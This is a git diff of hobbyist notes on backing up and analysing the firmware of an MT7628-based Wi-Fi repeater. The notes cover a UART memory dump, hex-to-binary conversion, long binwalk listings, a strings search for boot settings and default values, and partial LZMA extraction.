@@ -28,3 +28,1405 @@
 * **Stock OS:** Compressed **830.7 KB** legacy Linux firmware image named **`zxrouter`** running a minimal BusyBox environment.
 
 ---
+
+First let's try reading the flash mamory to back it up
+
+MT7628 # spi read 0 400000
+malloc error
+
+=> we can't ? we don't have enough memory ? what about reading in chunks ?
+
+MT7628 # spi read 0 40000
+malloc error
+
+.... same ? let's try only one 
+
+MT7628 # spi read 0 1
+read len: 1
+ff 
+
+good what about 256 byte ?
+
+MT7628 # spi read 0 100
+read len: 256
+ff 0 0 10 0 0 0 0 fd 0 0 10 0 0 0 0 d 3 0 10 0 0 0 0 b 3 0 10 0 0 0 0 9 3 0 10 0 0 0 0 7 3 0 10 0 0 0 0 5 
+MT7628 # 
+
+but this is so small so while looking this up I found that MediaTek's SPI flash is usually automatically memory-mapped directly into
+the CPU's uncached virtual memory segment (kseg1) starting at physical address 0xBC000000.
+
+so let's try reading from it and see if it give us the same data as spi read;
+
+MT7628 # md.b BC000000 20
+bc000000: ff 00 00 10 00 00 00 00 fd 00 00 10 00 00 00 00    ................
+bc000010: 0d 03 00 10 00 00 00 00 0b 03 00 10 00 00 00 00    ................
+MT7628 # 
+
+
+=>>> JACKPOT ....
+
+
+so let's read the full thing and using minicom we can log the uart data into a file;
+
+... a few moments later... I mean 58:00.41 minutes later
+
+-rw-rw-r--  1 orayn orayn  20M May 17 18:26 raw_flash_steam.txt
+
+let's now clare all data we don't need and then get the values in a binary format
+
+awk -F: '/^[0-9a-fA-F]{8}:/ {print substr($2, 1, 48)}' raw_flash_steam.txt | xxd -r -p > factory_backup.bin
+
+
+➜  G-WPR git:(main) ✗ ls -ltrah
+total 24M
+-rw-rw-r--  1 orayn orayn   53 May 16 23:58 README.md
+-rw-rw-r--  1 orayn orayn  35K May 16 23:58 LICENSE
+-rw-rw-r--  1 orayn orayn 1.2K May 17 00:00 notes.txt
+drwxrwxr-x  8 orayn orayn 4.0K May 17 00:00 .git
+drwxrwxr-x  2 orayn orayn 4.0K May 17 18:23 assets
+-rw-rw-r--  1 orayn orayn  20M May 17 18:26 raw_flash_steam.txt
+drwxrwxr-x  4 orayn orayn 4.0K May 17 18:32 .
+-rw-rw-r--  1 orayn orayn 4.0M May 17 18:32 factory_backup.bin
+drwx------ 31 orayn orayn 4.0K May 17 18:32 ..
+➜  G-WPR git:(main) ✗ stat -c %s factory_backup.bin
+4194304
+
+
+
+=> using binwalker:
+```
+➜  G-WPR git:(main) ✗ binwalk factory_backup.bin
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+52069         0xCB65          JBOOT STAG header, image id: 6, timestamp 0x18027118, image size: 4019174400 bytes, image JBOOT checksum: 0x60FF, header JBOOT checksum: 0x14
+52553         0xCD49          JBOOT STAG header, image id: 16, timestamp 0x21240400, image size: 822083624 bytes, image JBOOT checksum: 0xA600, header JBOOT checksum: 0x127
+64213         0xFAD5          JBOOT STAG header, image id: 16, timestamp 0x21100000, image size: 33554576 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0x2110
+85617         0x14E71         JBOOT STAG header, image id: 6, timestamp 0xCB10, image size: 799836416 bytes, image JBOOT checksum: 0x4000, header JBOOT checksum: 0x2110
+85685         0x14EB5         JBOOT STAG header, image id: 6, timestamp 0x1F00CB10, image size: 554713088 bytes, image JBOOT checksum: 0xA010, header JBOOT checksum: 0xFF00
+88976         0x15B90         U-Boot version string, "U-Boot 1.1.3 (Dec 13 2017 - 04:47:08)"
+89687         0x15E57         HTML document header
+90110         0x15FFE         HTML document footer
+90211         0x16063         HTML document header
+90594         0x161E2         HTML document footer
+90665         0x16229         PNG image, 224 x 52, 8-bit colormap, non-interlaced
+90775         0x16297         Zlib compressed data, best compression
+91183         0x1642F         HTML document header
+91635         0x165F3         HTML document footer
+91735         0x16657         HTML document header
+93073         0x16B91         HTML document footer
+93667         0x16DE3         HTML document header
+94061         0x16F6D         HTML document footer
+94175         0x16FDF         HTML document header
+94540         0x1714C         HTML document footer
+203648        0x31B80         eCos RTOS string reference: "ECOSAPClient"
+327680        0x50000         uImage header, header size: 64 bytes, header CRC: 0x7C44DD66, created: 2024-04-15 07:13:07, image size: 850604 bytes, Data Address: 0x80500000, Entry Point: 0x80500000, data CRC: 0x6BC296D5, OS: Linux, CPU: MIPS, image type: Standalone Program, compression type: none, image name: "zxrouter"
+334521        0x51AB9         JBOOT STAG header, image id: 16, timestamp 0xB900B910, image size: 1065214 bytes, image JBOOT checksum: 0x912, header JBOOT checksum: 0x0
+335569        0x51ED1         JBOOT STAG header, image id: 6, timestamp 0x6510, image size: 4221863424 bytes, image JBOOT checksum: 0x40FF, header JBOOT checksum: 0x214
+337024        0x52480         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2420424 bytes
+2149221       0x20CB65        JBOOT STAG header, image id: 6, timestamp 0x18027118, image size: 4019174400 bytes, image JBOOT checksum: 0x60FF, header JBOOT checksum: 0x14
+2149705       0x20CD49        JBOOT STAG header, image id: 16, timestamp 0x21240400, image size: 822083624 bytes, image JBOOT checksum: 0xA600, header JBOOT checksum: 0x127
+2161365       0x20FAD5        JBOOT STAG header, image id: 16, timestamp 0x21100000, image size: 33554576 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0x2110
+2182769       0x214E71        JBOOT STAG header, image id: 6, timestamp 0xCB10, image size: 799836416 bytes, image JBOOT checksum: 0x4000, header JBOOT checksum: 0x2110
+2182837       0x214EB5        JBOOT STAG header, image id: 6, timestamp 0x1F00CB10, image size: 554713088 bytes, image JBOOT checksum: 0xA010, header JBOOT checksum: 0xFF00
+2186128       0x215B90        U-Boot version string, "U-Boot 1.1.3 (Dec 13 2017 - 04:47:08)"
+2186839       0x215E57        HTML document header
+2187262       0x215FFE        HTML document footer
+2187363       0x216063        HTML document header
+2187746       0x2161E2        HTML document footer
+2187817       0x216229        PNG image, 224 x 52, 8-bit colormap, non-interlaced
+2187927       0x216297        Zlib compressed data, best compression
+2188335       0x21642F        HTML document header
+2188787       0x2165F3        HTML document footer
+2188887       0x216657        HTML document header
+2190225       0x216B91        HTML document footer
+2190819       0x216DE3        HTML document header
+2191213       0x216F6D        HTML document footer
+2191327       0x216FDF        HTML document header
+2191692       0x21714C        HTML document footer
+2300800       0x231B80        eCos RTOS string reference: "ECOSAPClient"
+2424832       0x250000        uImage header, header size: 64 bytes, header CRC: 0x7C44DD66, created: 2024-04-15 07:13:07, image size: 850604 bytes, Data Address: 0x80500000, Entry Point: 0x80500000, data CRC: 0x6BC296D5, OS: Linux, CPU: MIPS, image type: Standalone Program, compression type: none, image name: "zxrouter"
+2431673       0x251AB9        JBOOT STAG header, image id: 16, timestamp 0xB900B910, image size: 1065214 bytes, image JBOOT checksum: 0x912, header JBOOT checksum: 0x0
+2432721       0x251ED1        JBOOT STAG header, image id: 6, timestamp 0x6510, image size: 4221863424 bytes, image JBOOT checksum: 0x40FF, header JBOOT checksum: 0x214
+2434176       0x252480        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2420424 bytes
+```
+
+
+well binwalker gave us a great insight into the actual flash memory:
+1- The flash contains two identical layouts mirrored perfectly, seem they call it: Dual-Image Failover Layout or an A/B partition scheme.
+2- we can use strings on the binary to gain more info:
+strings factory_backup.bin > firmware_strings
+and gain infos like the server ip (we already know but u get the deal):
+=> grep "serverip=" firmware_strings.txt -B 5 -A 10
+bootcmd=tftp
+bootdelay=5
+baudrate=57600
+ethaddr="00:AA:BB:CC:DD:10"
+ipaddr=192.168.11.8
+serverip=192.168.11.11
+(((((
+AAAAAA
+BBBBBB
+admin
+ap.login
+BFROS_WIFI
+admin
+0.pool.ntp.org
+auto
+BFROS_WIFI
+--
+bootcmd=tftp
+bootdelay=5
+baudrate=57600
+ethaddr="00:AA:BB:CC:DD:10"
+ipaddr=192.168.11.8
+serverip=192.168.11.11
+(((((
+AAAAAA
+BBBBBB
+admin
+ap.login
+BFROS_WIFI
+admin
+0.pool.ntp.org
+auto
+BFROS_WIFI
+
+
+==> from this we can find that:
+- admin: is almost certainly the hardcoded default web management UI username or password.
+- BFROS_WIFI: is the factory default SSID that the repeater broadcasts when it is unconfigured out of the box.
+
+
+= also binwalker showed that Right after the kernel header, we hit raw LZMA compressed data; This contains the root directory
+layout (/bin, /sbin, /etc) of the factory firmware.
+
+=> so let's extract it:
+1st let's isolate it using dd:
+> dd if=factory_backup.bin of=filesystem.lzma bs=1 skip=337024 count=1762176
+once isolate it let's extract it:
+➜  G-WPR git:(main) ✗ lzma -d filesystem.lzma
+lzma: filesystem.lzma: Compressed data is corrupt
+
+ops why not ? seems like old and legacy MediaTek SDKs frequently used modified or non-standard LZMA header format;
+so we need to do it in another way;
+well binwalk is the one who said we have a LZMA compressed data so binwalk should get it for us, luckly:
+binwalk --help
+-e, --extract                Automatically extract known file types
+
+ binwalk -e factory_backup.bin 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+90775         0x16297         Zlib compressed data, best compression
+337024        0x52480         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2420424 bytes
+2187927       0x216297        Zlib compressed data, best compression
+2434176       0x252480        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2420424 bytes
+
+WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
+
+➜  G-WPR git:(main) ✗ cd _factory_backup.bin.extracted 
+➜  _factory_backup.bin.extracted git:(main) ✗ ls
+16297  16297.zlib  216297  216297.zlib  252480  252480.7z  52480  52480.7z
+
+
+wait wait wait:
+
+file 52480
+52480: Targa image data 32769 x 15364 x 8 +9189 - 4-bit alpha - four way interleave "\204$\020"
+
+data ? data ? mmmmmm
+```
+➜  _factory_backup.bin.extracted git:(main) ✗ binwalk 52480
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+116           0x74            eCos kernel exception handler, architecture: MIPSEL, exception vector table base address: 0x80018200
+256           0x100           eCos kernel exception handler, architecture: MIPSEL, exception vector table base address: 0x80018200
+4269          0x10AD          JBOOT STAG header, image id: 2, timestamp 0x8C00E510, image size: 722485248 bytes, image JBOOT checksum: 0x6A10, header JBOOT checksum: 0x100
+5169          0x1431          JBOOT STAG header, image id: 2, timestamp 0x400E810, image size: 1327104 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0x2B00
+6293          0x1895          JBOOT STAG header, image id: 2, timestamp 0xB800E910, image size: 1064960 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0x2300
+7845          0x1EA5          JBOOT STAG header, image id: 3, timestamp 0xC010210, image size: 1327104 bytes, image JBOOT checksum: 0x8300, header JBOOT checksum: 0x8AE
+16061         0x3EBD          JBOOT STAG header, image id: 4, timestamp 0x213C0480, image size: 822321192 bytes, image JBOOT checksum: 0x495, header JBOOT checksum: 0x680C
+17433         0x4419          JBOOT STAG header, image id: 2, timestamp 0x3120200, image size: 505676288 bytes, image JBOOT checksum: 0x200, header JBOOT checksum: 0x112
+52869         0xCE85          JBOOT STAG header, image id: 4, timestamp 0x640641FE, image size: 2341453569 bytes, image JBOOT checksum: 0x53, header JBOOT checksum: 0x1B08
+79573         0x136D5         JBOOT STAG header, image id: 4, timestamp 0xCE029310, image size: 185335916 bytes, image JBOOT checksum: 0x8298, header JBOOT checksum: 0x602
+97433         0x17C99         JBOOT STAG header, image id: 8, timestamp 0x4B080080, image size: 438568448 bytes, image JBOOT checksum: 0xA600, header JBOOT checksum: 0xB010
+146613        0x23CB5         JBOOT STAG header, image id: 3, timestamp 0x104300, image size: 268435456 bytes, image JBOOT checksum: 0xA600, header JBOOT checksum: 0x218F
+157893        0x268C5         JBOOT STAG header, image id: 2, timestamp 0x80800BB, image size: 1353622019 bytes, image JBOOT checksum: 0x20FF, header JBOOT checksum: 0xC012
+158045        0x2695D         JBOOT STAG header, image id: 2, timestamp 0x80800BB, image size: 565092867 bytes, image JBOOT checksum: 0xC028, header JBOOT checksum: 0x6D02
+158073        0x26979         JBOOT STAG header, image id: 2, timestamp 0x80800BB, image size: 145662467 bytes, image JBOOT checksum: 0xA203, header JBOOT checksum: 0x86AE
+159329        0x26E61         JBOOT STAG header, image id: 2, timestamp 0x106200, image size: 2147483648 bytes, image JBOOT checksum: 0x1421, header JBOOT checksum: 0x0
+179569        0x2BD71         JBOOT STAG header, image id: 6, timestamp 0x3F007420, image size: 169115648 bytes, image JBOOT checksum: 0x1230, header JBOOT checksum: 0x3000
+179981        0x2BF0D         JBOOT STAG header, image id: 6, timestamp 0x210800D0, image size: 503333104 bytes, image JBOOT checksum: 0x480, header JBOOT checksum: 0x1B3C
+192857        0x2F159         JBOOT STAG header, image id: 8, timestamp 0xE1025410, image size: 1477460223 bytes, image JBOOT checksum: 0xA500, header JBOOT checksum: 0x8F
+195269        0x2FAC5         JBOOT STAG header, image id: 7, timestamp 0x21010710, image size: 1073807384 bytes, image JBOOT checksum: 0x1220, header JBOOT checksum: 0xA00
+223161        0x367B9         JBOOT STAG header, image id: 2, timestamp 0xA3A200, image size: 1771030528 bytes, image JBOOT checksum: 0x200, header JBOOT checksum: 0x424
+235361        0x39761         JBOOT STAG header, image id: 6, timestamp 0x5500C810, image size: 554713088 bytes, image JBOOT checksum: 0x2618, header JBOOT checksum: 0x2
+288409        0x46699         JBOOT STAG header, image id: 3, timestamp 0xF5024310, image size: 554713343 bytes, image JBOOT checksum: 0x60A8, header JBOOT checksum: 0xFF00
+288649        0x46789         JBOOT STAG header, image id: 3, timestamp 0x28026310, image size: 1064962 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0x2100
+288977        0x468D1         JBOOT STAG header, image id: 3, timestamp 0xF403C310, image size: 4279255040 bytes, image JBOOT checksum: 0x82FF, header JBOOT checksum: 0xFF24
+309637        0x4B985         JBOOT STAG header, image id: 2, timestamp 0x126200, image size: 44998656 bytes, image JBOOT checksum: 0x200, header JBOOT checksum: 0x3C
+312301        0x4C3ED         JBOOT STAG header, image id: 2, timestamp 0x1A00C518, image size: 4027604992 bytes, image JBOOT checksum: 0x82C4, header JBOOT checksum: 0xE1AC
+348437        0x55115         JBOOT STAG header, image id: 10, timestamp 0x3A240B00, image size: 287574272 bytes, image JBOOT checksum: 0x800, header JBOOT checksum: 0x624
+358485        0x57855         JBOOT STAG header, image id: 6, timestamp 0x3C08017F, image size: 2844763392 bytes, image JBOOT checksum: 0x654, header JBOOT checksum: 0x8C0C
+359137        0x57AE1         JBOOT STAG header, image id: 6, timestamp 0x3C08017F, image size: 814720256 bytes, image JBOOT checksum: 0xA200, header JBOOT checksum: 0x878F
+360285        0x57F5D         JBOOT STAG header, image id: 11, timestamp 0x3A240C00, image size: 639896064 bytes, image JBOOT checksum: 0x8900, header JBOOT checksum: 0x2110
+393097        0x5FF89         JBOOT STAG header, image id: 4, timestamp 0xB02E410, image size: 16810680 bytes, image JBOOT checksum: 0xA500, header JBOOT checksum: 0xF124
+394477        0x604ED         JBOOT STAG header, image id: 5, timestamp 0xB010510, image size: 1064960 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0x2B00
+394517        0x60515         JBOOT STAG header, image id: 5, timestamp 0xF7010510, image size: 269762815 bytes, image JBOOT checksum: 0xB500, header JBOOT checksum: 0x2B36
+394777        0x60619         JBOOT STAG header, image id: 5, timestamp 0xE010510, image size: 722485248 bytes, image JBOOT checksum: 0x6520, header JBOOT checksum: 0x2102
+394829        0x6064D         JBOOT STAG header, image id: 5, timestamp 0xF4010510, image size: 722747647 bytes, image JBOOT checksum: 0x6520, header JBOOT checksum: 0x2102
+401413        0x62005         JBOOT STAG header, image id: 5, timestamp 0xDE02A510, image size: 1064960 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0xC400
+401937        0x62211         JBOOT STAG header, image id: 4, timestamp 0x2600C410, image size: 1064960 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0xB400
+475261        0x7407D         JBOOT STAG header, image id: 2, timestamp 0xA412A200, image size: 3465445983 bytes, image JBOOT checksum: 0x40FF, header JBOOT checksum: 0x2110
+541641        0x843C9         JBOOT STAG header, image id: 4, timestamp 0x24000210, image size: 2147509272 bytes, image JBOOT checksum: 0x211, header JBOOT checksum: 0x2500
+633629        0x9AB1D         JBOOT STAG header, image id: 2, timestamp 0x10A200, image size: 1879048192 bytes, image JBOOT checksum: 0x200, header JBOOT checksum: 0x2824
+696693        0xAA175         JBOOT STAG header, image id: 2, timestamp 0x106200, image size: 2147483648 bytes, image JBOOT checksum: 0x84AA, header JBOOT checksum: 0x2A90
+698789        0xAA9A5         JBOOT STAG header, image id: 2, timestamp 0x23348424, image size: 3946579328 bytes, image JBOOT checksum: 0x627, header JBOOT checksum: 0x2BA2
+710277        0xAD685         JBOOT STAG header, image id: 2, timestamp 0x63010A10, image size: 588529919 bytes, image JBOOT checksum: 0x280, header JBOOT checksum: 0x633C
+745237        0xB5F15         JBOOT STAG header, image id: 3, timestamp 0x8A0A05D, image size: 553902080 bytes, image JBOOT checksum: 0x6010, header JBOOT checksum: 0x1000
+749081        0xB6E19         JBOOT STAG header, image id: 16, timestamp 0x2CA3AE00, image size: 1017356800 bytes, image JBOOT checksum: 0xA300, header JBOOT checksum: 0x3BA3
+761565        0xB9EDD         JBOOT STAG header, image id: 3, timestamp 0x4144304, image size: 807666176 bytes, image JBOOT checksum: 0x6200, header JBOOT checksum: 0x3CAE
+773133        0xBCC0D         JBOOT STAG header, image id: 3, timestamp 0x4144300, image size: 3559129600 bytes, image JBOOT checksum: 0x313, header JBOOT checksum: 0xA808
+797161        0xC29E9         JBOOT STAG header, image id: 3, timestamp 0xD808032B, image size: 2157986649 bytes, image JBOOT checksum: 0xB10, header JBOOT checksum: 0x5400
+828413        0xCA3FD         JBOOT STAG header, image id: 2, timestamp 0xFF004420, image size: 204514560 bytes, image JBOOT checksum: 0x8000, header JBOOT checksum: 0xFF14
+831121        0xCAE91         JBOOT STAG header, image id: 3, timestamp 0x6006210, image size: 18104320 bytes, image JBOOT checksum: 0xD00, header JBOOT checksum: 0x2024
+869065        0xD42C9         JBOOT STAG header, image id: 2, timestamp 0x106201, image size: 16777216 bytes, image JBOOT checksum: 0x200, header JBOOT checksum: 0x4A3A
+911187        0xDE753         JBOOT SCH2 kernel header, compression type: none, Entry Point: 0x42002B24, image size: 1107302418 bytes, data CRC: 0x40FFD42E, Data Address: 0x2000710, rootfs offset: 0x1210C23C, rootfs size: 35176448 bytes, rootfs CRC: 0x43182300, header CRC: 0x4000102, header size: 1060 bytes, cmd line length: 25632 bytes
+911189        0xDE755         JBOOT STAG header, image id: 2, timestamp 0x18124200, image size: 3559801344 bytes, image JBOOT checksum: 0x40FF, header JBOOT checksum: 0x710
+914441        0xDF409         JBOOT STAG header, image id: 2, timestamp 0x1B108200, image size: 104596096 bytes, image JBOOT checksum: 0x8200, header JBOOT checksum: 0x102C
+967941        0xEC505         JBOOT STAG header, image id: 5, timestamp 0x1922220, image size: 2854502912 bytes, image JBOOT checksum: 0x3D0, header JBOOT checksum: 0x2B08
+968061        0xEC57D         JBOOT STAG header, image id: 10, timestamp 0xA0922220, image size: 19276836 bytes, image JBOOT checksum: 0x4200, header JBOOT checksum: 0x2B24
+1013233       0xF75F1         JBOOT STAG header, image id: 2, timestamp 0x2500E610, image size: 1327104 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0x300
+1102585       0x10D2F9        JBOOT STAG header, image id: 6, timestamp 0xE9023410, image size: 1327359 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0x2100
+1149181       0x1188FD        JBOOT STAG header, image id: 16, timestamp 0x10080483, image size: 1032733696 bytes, image JBOOT checksum: 0x49F, header JBOOT checksum: 0xC
+1190233       0x122959        JBOOT STAG header, image id: 16, timestamp 0xB900B910, image size: 1065214 bytes, image JBOOT checksum: 0x912, header JBOOT checksum: 0x0
+1191321       0x122D99        JBOOT STAG header, image id: 6, timestamp 0x6510, image size: 4221863424 bytes, image JBOOT checksum: 0x40FF, header JBOOT checksum: 0x214
+1263405       0x13472D        JBOOT STAG header, image id: 3, timestamp 0xEE006210, image size: 622084351 bytes, image JBOOT checksum: 0x280, header JBOOT checksum: 0x183C
+1263577       0x1347D9        JBOOT STAG header, image id: 5, timestamp 0x103C0280, image size: 1745356019 bytes, image JBOOT checksum: 0x5034, header JBOOT checksum: 0x2524
+1277997       0x13802D        JBOOT STAG header, image id: 2, timestamp 0x8005210, image size: 554975232 bytes, image JBOOT checksum: 0x4030, header JBOOT checksum: 0xC02
+1293729       0x13BDA1        JBOOT STAG header, image id: 6, timestamp 0x25104000, image size: 540803968 bytes, image JBOOT checksum: 0x6274, header JBOOT checksum: 0x8C
+1296597       0x13C8D5        JBOOT STAG header, image id: 6, timestamp 0xA03C0280, image size: 2435072528 bytes, image JBOOT checksum: 0x512, header JBOOT checksum: 0x3C08
+1321257       0x142929        JBOOT STAG header, image id: 16, timestamp 0xE03C0380, image size: 1545888527 bytes, image JBOOT checksum: 0x6200, header JBOOT checksum: 0x1C8C
+1330897       0x144ED1        JBOOT STAG header, image id: 3, timestamp 0x43C0280, image size: 9420544 bytes, image JBOOT checksum: 0xB000, header JBOOT checksum: 0x9C8F
+1392913       0x154111        JBOOT STAG header, image id: 6, timestamp 0x213C0780, image size: 1073881120 bytes, image JBOOT checksum: 0xE713, header JBOOT checksum: 0x3624
+1395997       0x154D1D        JBOOT STAG header, image id: 6, timestamp 0x50C0492, image size: 86247168 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0x1524
+1396845       0x15506D        JBOOT STAG header, image id: 6, timestamp 0x2B3C0280, image size: 557581184 bytes, image JBOOT checksum: 0xE020, header JBOOT checksum: 0x2102
+1398149       0x155585        JBOOT STAG header, image id: 6, timestamp 0x50C0492, image size: 86247168 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0xE524
+1398273       0x155601        JBOOT STAG header, image id: 7, timestamp 0xC0492, image size: 83886080 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0xF524
+1435669       0x15E815        JBOOT STAG header, image id: 5, timestamp 0x843C0380, image size: 136602419 bytes, image JBOOT checksum: 0x6200, header JBOOT checksum: 0x218C
+1440957       0x15FCBD        JBOOT STAG header, image id: 2, timestamp 0x13106200, image size: 271655680 bytes, image JBOOT checksum: 0x200, header JBOOT checksum: 0x1F24
+1462597       0x165145        JBOOT STAG header, image id: 2, timestamp 0x213C1180, image size: 1392746528 bytes, image JBOOT checksum: 0x688, header JBOOT checksum: 0xE80C
+1462621       0x16515D        JBOOT STAG header, image id: 2, timestamp 0xBC3C0280, image size: 478954431 bytes, image JBOOT checksum: 0x400, header JBOOT checksum: 0xDF8E
+1468389       0x1667E5        JBOOT STAG header, image id: 2, timestamp 0x108203, image size: 50331648 bytes, image JBOOT checksum: 0x8300, header JBOOT checksum: 0x230
+1468405       0x1667F5        JBOOT STAG header, image id: 2, timestamp 0x2A106203, image size: 876348800 bytes, image JBOOT checksum: 0x8400, header JBOOT checksum: 0x808E
+1479521       0x169361        JBOOT STAG header, image id: 3, timestamp 0x10104300, image size: 9414400 bytes, image JBOOT checksum: 0x200, header JBOOT checksum: 0x218E
+1484993       0x16A8C1        JBOOT STAG header, image id: 7, timestamp 0xC0492, image size: 67108864 bytes, image JBOOT checksum: 0x4200, header JBOOT checksum: 0xF128
+1485281       0x16A9E1        JBOOT STAG header, image id: 6, timestamp 0x50C0492, image size: 86247168 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0xF124
+1485701       0x16AB85        JBOOT STAG header, image id: 6, timestamp 0x90C0492, image size: 153356032 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0xF124
+1486185       0x16AD69        JBOOT STAG header, image id: 6, timestamp 0x60C0492, image size: 103024384 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0xF224
+1487541       0x16B2B5        JBOOT STAG header, image id: 6, timestamp 0x30C0492, image size: 52692736 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0x1024
+1505229       0x16F7CD        JBOOT STAG header, image id: 6, timestamp 0xD0C0492, image size: 220464896 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0xEF24
+1506965       0x16FE95        JBOOT STAG header, image id: 6, timestamp 0x80C0492, image size: 136578816 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0xF124
+1507909       0x170245        JBOOT STAG header, image id: 6, timestamp 0x30C0492, image size: 52692736 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0x1324
+1507981       0x17028D        JBOOT STAG header, image id: 6, timestamp 0x30C0492, image size: 52692736 bytes, image JBOOT checksum: 0x300, header JBOOT checksum: 0xEF24
+1513137       0x1716B1        JBOOT STAG header, image id: 8, timestamp 0x1104800, image size: 556057856 bytes, image JBOOT checksum: 0xA610, header JBOOT checksum: 0x3
+1586945       0x183701        JBOOT STAG header, image id: 2, timestamp 0xA000528, image size: 2147485968 bytes, image JBOOT checksum: 0x400, header JBOOT checksum: 0x2524
+1595529       0x185889        JBOOT STAG header, image id: 6, timestamp 0x103C0480, image size: 1948517888 bytes, image JBOOT checksum: 0x8443, header JBOOT checksum: 0x9F24
+1602657       0x187461        JBOOT STAG header, image id: 6, timestamp 0x213C1180, image size: 1946288160 bytes, image JBOOT checksum: 0x453D, header JBOOT checksum: 0x2126
+1602977       0x1875A1        JBOOT STAG header, image id: 6, timestamp 0x213C1280, image size: 1224867880 bytes, image JBOOT checksum: 0x623, header JBOOT checksum: 0x210C
+1603009       0x1875C1        JBOOT STAG header, image id: 6, timestamp 0x743C0580, image size: 1948664893 bytes, image JBOOT checksum: 0xA543, header JBOOT checksum: 0x9F24
+1623053       0x18C40D        JBOOT STAG header, image id: 5, timestamp 0x21240600, image size: 4211081272 bytes, image JBOOT checksum: 0x651, header JBOOT checksum: 0x2108
+1625525       0x18CDB5        JBOOT STAG header, image id: 2, timestamp 0x211602FE, image size: 32 bytes, image JBOOT checksum: 0xD000, header JBOOT checksum: 0x1982
+1661657       0x195AD9        JBOOT STAG header, image id: 8, timestamp 0x20240900, image size: 3626241024 bytes, image JBOOT checksum: 0xA302, header JBOOT checksum: 0x9CAF
+1668293       0x1974C5        JBOOT STAG header, image id: 2, timestamp 0x62009218, image size: 1444175872 bytes, image JBOOT checksum: 0xA201, header JBOOT checksum: 0x55A3
+1668485       0x197585        JBOOT STAG header, image id: 5, timestamp 0x5C03D010, image size: 554975232 bytes, image JBOOT checksum: 0x8018, header JBOOT checksum: 0x5100
+1668989       0x19777D        JBOOT STAG header, image id: 5, timestamp 0xCA00F410, image size: 554713343 bytes, image JBOOT checksum: 0x8018, header JBOOT checksum: 0xFF00
+1695241       0x19DE09        JBOOT STAG header, image id: 12, timestamp 0x8241500, image size: 254023168 bytes, image JBOOT checksum: 0x900, header JBOOT checksum: 0x1C24
+1697281       0x19E601        JBOOT STAG header, image id: 5, timestamp 0xB83C0380, image size: 78407099 bytes, image JBOOT checksum: 0x8200, header JBOOT checksum: 0x18C
+1699973       0x19F085        JBOOT STAG header, image id: 2, timestamp 0xBC3C0380, image size: 3364643515 bytes, image JBOOT checksum: 0xBDFF, header JBOOT checksum: 0x2827
+1704429       0x1A01ED        JBOOT STAG header, image id: 2, timestamp 0xC00A618, image size: 430948096 bytes, image JBOOT checksum: 0x6000, header JBOOT checksum: 0x2814
+1706293       0x1A0935        JBOOT STAG header, image id: 2, timestamp 0xC00C210, image size: 1327104 bytes, image JBOOT checksum: 0x0, header JBOOT checksum: 0x400
+1721130       0x1A432A        MP3 ID3 tag,
+1725168       0x1A52F0        eCos RTOS string reference: "ECOSAPClient"
+1726555       0x1A585B        eCos RTOS string reference: "eCosAP"
+1727940       0x1A5DC4        HTML document header
+1728068       0x1A5E44        HTML document header
+1728108       0x1A5E6C        HTML document header
+1728295       0x1A5F27        HTML document footer
+1846269       0x1C2BFD        eCos RTOS string reference: "ecos/rt_profile.c"
+1852205       0x1C432D        eCos RTOS string reference: "ecos/rt_rbus_pci_util.c"
+1863843       0x1C70A3        eCos RTOS string reference: "ecos_deliver()"
+1863868       0x1C70BC        eCos RTOS string reference: "ecos_deliver()"
+1863890       0x1C70D2        eCos RTOS string reference: "ecos_send()"
+1864042       0x1C716A        eCos RTOS string reference: "ecos_send()"
+1864059       0x1C717B        eCos RTOS string reference: "ecos_control()"
+1864088       0x1C7198        eCos RTOS string reference: "ecos_stop()"
+1864112       0x1C71B0        eCos RTOS string reference: "ecos_stop()"
+1864136       0x1C71C8        eCos RTOS string reference: "ecos_start()"
+1864216       0x1C7218        eCos RTOS string reference: "ecos_start()"
+1864240       0x1C7230        eCos RTOS string reference: "ecos_apcli_init()"
+1864268       0x1C724C        eCos RTOS string reference: "ecos_apcli_init()"
+1864296       0x1C7268        eCos RTOS string reference: "ecos_mbss_init()"
+1864324       0x1C7284        eCos RTOS string reference: "ecos_mbss_init()"
+1864352       0x1C72A0        eCos RTOS string reference: "ecos_init()"
+1864448       0x1C7300        eCos RTOS string reference: "ecos_init()"
+1873084       0x1C94BC        Unix path: /etc/Wireless/RT2860AP/RT2860AP.dat
+1885436       0x1CC4FC        XML document, version: "1.0"
+1890521       0x1CD8D9        eCos RTOS string reference: "ecos/rt_ecos.c"
+1890529       0x1CD8E1        eCos RTOS string reference: "ecos.c"
+1891897       0x1CDE39        eCos RTOS string reference: "ecos/rt_main_dev.c"
+1904835       0x1D10C3        eCos RTOS string reference: "ecos_apcli_init"
+1905415       0x1D1307        eCos RTOS string reference: "ecos_init"
+1906948       0x1D1904        SHA256 hash constants, little endian
+1907272       0x1D1A48        AES Inverse S-Box
+1908568       0x1D1F58        AES S-Box
